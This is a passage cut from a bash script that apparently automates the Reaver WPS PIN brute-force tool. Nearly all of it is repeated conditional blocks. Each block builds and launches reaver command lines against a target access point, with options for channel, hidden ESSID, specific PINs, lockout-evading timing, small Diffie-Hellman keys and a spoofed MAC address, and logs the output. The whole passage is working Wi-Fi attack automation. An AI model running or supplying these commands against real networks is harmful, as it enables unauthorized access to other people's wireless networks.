xterm -g 80x10-1+1 -T "Reaver3h-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver3h-no dh" -e "reaver -i $MON -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver4h-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver4h-no dh" -e "reaver -i $MON -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5h-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5h-no dh" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6h-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6h-no dh" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7h-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7h-no dh" -e "reaver -i $MON -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8h-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8h-no dh" -e "reaver -i $MON -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

###End  Reaver Program Booleans no -e essid End###

###Start Reaver Program Booleans Start with -e essid###

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver1e-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver1e-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L --mac=$VARMAC 2>&1 --session=$MACSTRIP.wpc | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver2e-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver2e-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver3e-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver3e-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver4e-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver4e-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5e-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5e-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6e-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6e-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7e-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7e-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8e-no dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8e-no dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

#######Start Reaver channel hopping options

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver1he-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver1he-no dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver2he-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver2he-no dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver3he-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver3he-no dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver4he-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver4he-no dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5he-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5he-no dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6he-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6he-no dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7he-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7he-no dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8he-no dh" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8he-no dh" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/tmp/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

###End All no --dh-small -S End#####

###Start All --dh-small -S Start#####

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver1-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -vvv -x 60 -L -S --mac=$VARMAC  2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver1-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -vvv -x 60 -L -S --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver2-dh" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver2-dh" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC --session=$MACSTRIP.wpc 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

